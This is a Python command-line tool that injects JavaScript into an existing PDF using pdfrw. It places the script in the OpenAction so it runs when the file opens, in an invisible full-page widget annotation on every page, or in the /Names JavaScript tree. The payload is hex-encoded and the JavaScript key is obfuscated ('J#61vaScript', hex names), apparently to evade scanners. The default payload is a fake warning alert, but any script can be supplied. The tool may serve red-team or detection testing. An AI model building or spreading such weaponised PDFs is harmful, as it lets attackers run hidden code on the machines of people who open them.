import os
import sys
import argparse

from pdfrw import PdfWriter, PdfReader, PdfName, PdfString, IndirectPdfDict

SCRIPT = 'app.alert({cMsg: "Something wrong!", cTitle: "WARNING"});'
NAME = 'ErrorScript'
PATH = ''
OUT = 'inj.pdf'
INJECT_PLACE = 'openaction'


def parse_params():
    parser = argparse.ArgumentParser(description='Inject JavaScript in PDF using PDFrw')
    parser.add_argument('-i', dest="path", help='path/to/orig.pdf', required=True)
    parser.add_argument('--script', dest="script", default=None, help=f'path to file with JS-script; \n{SCRIPT} by default')
    parser.add_argument('--name', dest="name", default=NAME, help=f'script name if injecting in /Names; \n{NAME} by default')
    parser.add_argument('--output', dest="out", default=OUT, help=f'output file name; \n{OUT} by default')
    parser.add_argument('--inject_place', dest="inject_place", default=INJECT_PLACE, help=f'[OpenAction | Annots | Names]; \n{INJECT_PLACE} by default')
    return parser.parse_args()


def add_in_annots(script, name, pdf_orig):
    annots = {PdfName.Annots: [{PdfName.Type: PdfName.Annots, PdfName.Subtype: PdfName.Widget,
                                PdfName.Rect: [0, 0, 900, 900],
                                PdfName.Border: [0, 0, 0], PdfName.A:
                                    {PdfName.S: PdfName.JavaScript,
                                     PdfName.JS: PdfString(script)},
                                PdfName.Parent: {PdfName.FT: PdfName.Btn, PdfName.T: PdfString(name)}}]
              }
    for i in range(len(pdf_orig.pages)):
        pdf_orig.pages[i].update(annots)
    return pdf_orig


def add_in_names(script, name, pdf_orig):
    names = IndirectPdfDict(**{"J#61vaScript": IndirectPdfDict(
        Names=[PdfString(name), IndirectPdfDict(JS=PdfString(script), S=PdfName('4A617661536372697074'))]
        )})
    pdf_orig.Root.Names = names
    return pdf_orig


def add_in_open_action(script, pdf_orig):
    open_action = IndirectPdfDict(Type=PdfName.Action, S=PdfName.JavaScript, JS=PdfString(script))
    pdf_orig.Root.OpenAction = open_action
    return pdf_orig


def main():
    params = parse_params()
    if not os.path.exists(params.path):
        print(f'File {params.path} does not exist')
        exit()
    pdf_orig = PdfReader(params.path)

    if params.script != None:
        if not os.path.exists(params.script):
            print(f'File {params.script} does not exist')
            exit()
        with open(params.script) as f:
            script = f.read()
    else: 
        script = SCRIPT
    script = '<' + script.encode().hex() + '>'

    name = '<' + params.name.encode().hex() + '>'

    if params.inject_place.lower() == 'annots':
        pdf_orig = add_in_annots(script, name, pdf_orig)
    elif params.inject_place.lower() == 'names':
        pdf_orig = add_in_names(script, name, pdf_orig)
    else:
        pdf_orig = add_in_open_action(script, pdf_orig)

    PdfWriter().write(params.out, pdf_orig)


if __name__ == '__main__':
    main()
